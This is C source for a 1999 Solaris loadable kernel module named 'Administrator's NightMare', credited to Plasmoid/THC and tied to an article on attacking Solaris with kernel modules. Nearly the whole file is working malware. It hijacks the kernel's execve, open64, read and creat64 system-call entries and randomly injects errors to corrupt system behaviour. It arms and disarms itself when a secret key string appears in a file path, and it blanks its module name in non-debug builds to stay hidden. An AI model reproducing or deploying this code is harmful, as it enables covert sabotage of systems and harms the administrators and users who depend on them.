/*
 * anm.c
 * Administrator's NightMare for Solaris 2.7 (sparc/x86)
 * (c) 1999 by Plasmoid/THC <plasmoid@pimmel.com>
 * [THC] The Hacker's Choice - http://www.infowar.co.uk/thc
 *
 * This is probably the most stupid module I ever programmed, instead
 * of faking syscalls or installing backdoors, this module just corrupts
 * a system, making it slightly unusable by randomly generating different
 * system errors. Respect to my fantasy and disrespect to my "un"-
 * seriousness.
 *
 * A documentation of the modules functions can be found in the corresponding
 * THC article at http://www.infowar.co.uk/thc/files/thc/slkm-1.0.html
 *
 *    Solaris Loadable Kernel Modules v1.0
 *    "Attacking Solaris with lodable kernel modules"
 *    by Plasmoid/THC
 *
 */
#include <sys/systm.h>
#include <sys/ddi.h>
#include <sys/sunddi.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/kmem.h>
#include <sys/errno.h>

#define KEY  		"my_stupid_key"

#define FALSE		0
#define TRUE		1

/*
 * This is the loadable module wrapper.
 */
#include <sys/modctl.h>
extern struct mod_ops mod_miscops;

/*
 * Structure of the system-entry table.
 */
extern struct sysent sysent[];

int (*oldexecve) (const char *, const char *[], const char *[]);
int (*oldopen64) (const char *path, int oflag, mode_t mode);
int (*oldread) (int fildes, void *buf, size_t nbyte);
int (*oldcreat64) (const char *path, mode_t mode);

int terror = FALSE;

/*
 * These values have been wisely chosen. The system will not report a lot
 * of errors - from time to time a small fault will influence the admins/
 * users life.
 */
int open_rate = 200;
int read_rate = 8000;
int exec_rate = 400;

char key[] = KEY;

int reg = 12345;

/*
 * This is a random number generator based on a 16 bit shifting register, 
 * since we all slept at the university, we donnot know the problems of
 * these algorithms: 1st limited period of random numbers, 
 *                   2nd same starting point, if no clock is used.
 * I guess you don't care about that, hmmm, me too :) 
 */
int anm_random(int range)
{
    int bit1, bit3, bit5, bit9, bitF;
    int new;

    bit1 = (reg & 0x0001) >> 0x0;
    bit3 = (reg & 0x0004) >> 0x2;
    bit5 = (reg & 0x0010) >> 0x4;
    bit9 = (reg & 0x0100) >> 0x8;
    bitF = (reg & 0x4000) >> 0xe;
    new = bit1 ^ bit3 ^ bit5 ^ bit9 ^ bitF;

    reg <<= 1;
    reg |= new;
    if (reg < 0)
	reg = -reg;
    return reg % range;
}

/*
 * The creat64() syscall is used as a switch for en- and disabling the
 * "terror" functions of this module.
 */
int newcreat64(const char *path, mode_t mode)
{
    if (strstr(path, (char *) &key) != NULL) {
	if (terror) {
#ifdef DEBUG
	    cmn_err(CE_NOTE, "anm: disabeling Administrator's NightMare");
#endif
	    terror = FALSE;
	} else {
#ifdef DEBUG
	    cmn_err(CE_NOTE, "anm: enabeling Administrator's NightMare");
#endif
	    terror = TRUE;
	}
	set_errno(ENFILE);
	return -1;
    } else
	return oldcreat64(path, mode);
}

int newopen64(const char *path, int oflag, mode_t mode)
{
    if (terror && open_rate == anm_random(open_rate) + 1) {
#ifdef DEBUG
	cmn_err(CE_NOTE, "anm: generating open64() error");
#endif
	switch (anm_random(7)) {
	case 0:
	    set_errno(EFAULT);
	    break;
	case 1:
	    set_errno(ENFILE);
	    break;
	case 2:
	    set_errno(EOVERFLOW);
	    break;
	case 3:
	    set_errno(ETXTBSY);
	    break;
	case 4:
	    set_errno(ENOMEM);
	    break;
	case 5:
	    set_errno(EMFILE);
	    break;
	default:
	    set_errno(ENOSR);
	}
	return -1;
    } else {
	return oldopen64(path, oflag, mode);
    }
}

ssize_t
newread(int fildes, void *buf, size_t nbyte)
{
    if (terror && read_rate == anm_random(read_rate) + 1) {
#ifdef DEBUG
	cmn_err(CE_NOTE, "anm: generating read() error");
#endif
	switch (anm_random(6)) {
	case 0:
	    set_errno(EAGAIN);
	    break;
	case 1:
	    set_errno(EFAULT);
	    break;
	case 2:
	    set_errno(EIO);
	    break;
	case 3:
	    set_errno(ENOLCK);
	    break;
	case 4:
	    set_errno(EINVAL);
	    break;
	default:
	    set_errno(ENXIO);
	}
	return -1;
    } else {
	return oldread(fildes, buf, nbyte);
    }
}

int newexecve(const char *filename, const char *argv[], const char *envp[])
{
    if (terror && exec_rate == anm_random(exec_rate) + 1) {
#ifdef DEBUG
	cmn_err(CE_NOTE, "anm: generating execve() error");
#endif
	switch (anm_random(6)) {
	case 0:
	    set_errno(E2BIG);
	    break;
	case 1:
	    set_errno(ENOMEM);
	    break;
	case 2:
	    set_errno(EAGAIN);
	    break;
	case 3:
	    set_errno(EILSEQ);
	    break;
	case 4:
	    set_errno(ELIBMAX);
	    break;
	default:
	    set_errno(ELIBBAD);
	}
	return -1;
    } else {
	return oldexecve(filename, argv, envp);
    }
}

/*
 * Module linkage information for the kernel.
 */
static struct modlmisc modlmisc =
{
    &mod_miscops,
#ifdef DEBUG
    "Administrator's NightMare",
#else
    ""
#endif
};

static struct modlinkage modlinkage =
{
    MODREV_1,
    (void *) &modlmisc,
    NULL
};

int _init(void)
{
    int i;

    if ((i = mod_install(&modlinkage)) != 0)
	cmn_err(CE_NOTE, "Could not install module\n");
#ifdef DEBUG
    else
	cmn_err(CE_NOTE, "anm: successfully installed");
#endif

    oldexecve = (void *) sysent[SYS_execve].sy_callc;
    oldopen64 = (void *) sysent[SYS_open64].sy_callc;
    oldcreat64 = (void *) sysent[SYS_creat64].sy_callc;
    oldread = (void *) sysent[SYS_read].sy_callc;

    sysent[SYS_execve].sy_callc = (void *) newexecve;
    sysent[SYS_open64].sy_callc = (void *) newopen64;
    sysent[SYS_creat64].sy_callc = (void *) newcreat64;
    sysent[SYS_read].sy_callc = (void *) newread;

    return i;
}

int _info(struct modinfo *modinfop)
{
    return (mod_info(&modlinkage, modinfop));
}


int _fini(void)
{
    int i;

    if ((i = mod_remove(&modlinkage)) != 0)
	cmn_err(CE_NOTE, "Could not remove module\n");
#ifdef DEBUG
    else
	cmn_err(CE_NOTE, "anm: successfully removed");
#endif

    sysent[SYS_execve].sy_callc = (void *) oldexecve;
    sysent[SYS_open64].sy_callc = (void *) oldopen64;
    sysent[SYS_creat64].sy_callc = (void *) oldcreat64;
    sysent[SYS_read].sy_callc = (void *) oldread;

    return i;
}
